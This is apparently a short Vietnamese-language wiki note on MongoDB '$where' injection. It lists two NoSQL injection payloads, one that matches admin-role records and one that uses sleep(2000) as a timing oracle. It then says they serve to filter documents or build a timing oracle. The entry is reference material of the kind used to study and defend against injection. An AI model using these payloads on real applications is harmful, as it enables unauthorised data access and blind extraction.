---
title: $where Payloads
type: entity
related: [[Server-Side JavaScript Injection]]
---

Các payload `$where` được nhắc đến:

```json
{"$where": "function(){return this.role == 'admin'}"}
{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}
```

Chúng dùng để lọc document hoặc tạo timing oracle.